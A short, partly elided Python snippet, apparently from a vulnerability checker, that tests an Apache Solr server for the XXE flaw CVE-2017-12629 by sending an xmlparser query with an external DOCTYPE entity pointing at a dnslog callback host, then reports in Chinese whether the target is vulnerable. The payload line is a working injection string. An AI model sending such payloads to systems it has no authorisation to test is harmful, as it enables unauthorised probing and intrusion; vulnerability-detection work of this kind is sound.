...
def main(ip):
    ...
    dnslog = Get_dnslog()
    cmd = 'http://' + dnslog
    url = ip + '/solr/'+ core + f'/select?q={{!xmlparser%20v=%27<!DOCTYPE%20a%20SYSTEM%20"{cmd}"><a></a>%27}}&wt=xml'
    ...
    if "dnslog.cn" in r1.text:
        return "存在漏洞xxe_CVE-2017-12629，请及时修复!"
    else:
        return "不存在漏洞xxe_CVE-2017-12629"
